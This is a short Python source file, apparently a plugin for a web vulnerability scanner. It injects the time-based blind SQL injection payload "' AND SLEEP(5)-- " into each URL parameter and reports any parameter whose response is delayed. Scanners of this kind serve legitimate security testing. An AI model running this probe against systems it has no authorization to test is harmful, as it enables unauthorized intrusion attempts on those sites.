import time
class SQLi:
    def run(self, ctx):
        for p in ctx.params:
            params = ctx.params.copy()
            params[p] = "' AND SLEEP(5)-- "
            test = ctx.url.split("?")[0] + "?" + "&".join(
                f"{k}={v}" for k, v in params.items()
            )

            start = time.time()
            ctx.http.get(test)
            if time.time() - start > 4:
                ctx.report("SQL Injection", p)
